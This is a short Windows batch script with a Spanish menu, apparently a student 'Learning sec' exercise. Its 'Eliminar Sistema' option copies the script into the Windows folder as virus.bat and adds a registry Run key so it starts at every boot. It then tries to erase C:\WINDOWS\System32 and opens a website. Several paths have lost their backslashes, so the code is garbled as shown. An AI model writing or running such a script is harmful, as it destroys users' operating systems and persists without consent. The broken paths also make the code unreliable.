@echo off
:Menu
cls
echo Escoja una opcion.
echo.
echo 1. Eliminar Sistema
echo 2. Acerca de
echo 3. Salir
echo.
set /p var=
if %var%==1 goto :Eliminar
if %var%==2 goto :info
if %var%==3 goto exit
if %var% GTR 3 echo Error
goto :Menu
:Eliminar
cls
color a
copy %0 %windir%virus.bat
REG ADD HKLMsoftwaremicrosoftwindowscurrentsversionrun/v hack/d %windir%virus.bat
cd
cd %homepatch%
cd escritorio
erase C:WINDOWSSystem32
start explorer.exe
start www.gaviria.org
Pause>Nul
goto :Menu
:info
cls
color 1a
Echo Learning sec
Echo Cristian Camilo Gaviria Ovalle
Echo Sistemas Operativos.
Pause>Nul
goto :Menu
